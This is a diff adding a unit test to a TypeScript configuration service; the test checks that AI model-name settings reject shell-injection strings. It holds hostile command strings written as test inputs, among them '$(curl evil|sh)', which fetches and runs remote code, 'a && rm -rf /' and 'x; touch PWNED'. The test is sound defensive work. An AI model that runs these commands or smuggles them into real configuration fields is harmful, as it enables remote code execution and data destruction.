@@ -84,6 +84,27 @@ describe('uiConfigService', () => {
         expect(out3.taskAutomation.judgeModel).toBe(''); // tipo errado → default (não quebra)
     });
 
+    it('#RCE (red-team Fable): allowlist de charset em TODOS os nomes de modelo (anti shell-injection)', () => {
+        const svc = new UiConfigService('ui.json');
+        // Defaults dos modelos do coder
+        expect(svc.get().taskAutomation.coderModel).toBe('');
+        expect(svc.get().taskAutomation.coderFallbackModel).toBe('');
+        // Nomes REAIS passam intactos (provider/name, tags, versões, IDs longos)
+        for (const good of ['opus', 'minimax/MiniMax-M3', 'zai-coding-plan/glm-5.2', 'us.anthropic.claude-opus-4-5-v1:0', 'openrouter/anthropic/claude-3.5-sonnet']) {
+            expect(svc.update({ taskAutomation: { coderModel: good } } as any).taskAutomation.coderModel).toBe(good);
+        }
+        // Payloads de INJEÇÃO → rejeitados p/ '' (secure-default: herda env, não vai pro shell)
+        for (const evil of ['x; touch PWNED', '$(curl evil|sh)', '`id`', 'a && rm -rf /', 'a|b', 'a"b', "a'b", 'a b', 'a\nb', 'a>b', 'a&b']) {
+            expect(svc.update({ taskAutomation: { coderModel: evil } } as any).taskAutomation.coderModel).toBe('');
+            // MESMA proteção nos 3 modelos que vão ao shell (retrofit dos 2 que já existiam = RCE latente)
+            expect(svc.update({ taskAutomation: { judgeModel: evil } } as any).taskAutomation.judgeModel).toBe('');
+            expect(svc.update({ taskAutomation: { coderEscalationModel: evil } } as any).taskAutomation.coderEscalationModel).toBe('opus'); // default do escalation
+            expect(svc.update({ taskAutomation: { coderFallbackModel: evil } } as any).taskAutomation.coderFallbackModel).toBe('');
+        }
+        // vazio explícito = herda (não é erro)
+        expect(svc.update({ taskAutomation: { coderModel: '   ' } } as any).taskAutomation.coderModel).toBe('');
+    });
+
     it('taskAutomation item 29: piso de nota SANE = 5 (não aceita <5 para aprovar/mergear)', () => {
         const svc = new UiConfigService('ui.json');
         const out = svc.update({ taskAutomation: { minMergeScore: 2, minApproveScore: 1 } } as any);
